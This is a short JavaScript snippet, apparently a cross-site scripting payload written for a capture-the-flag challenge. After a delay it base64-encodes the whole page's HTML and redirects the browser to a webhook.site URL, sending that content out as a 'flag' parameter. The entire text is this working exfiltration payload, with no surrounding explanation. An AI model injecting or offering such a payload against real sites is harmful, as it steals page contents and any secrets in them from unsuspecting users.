setTimeout(() => {
  const flag = btoa(document.documentElement.innerHTML);
  location.href = "https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?flag=" + flag;
}, 2000);
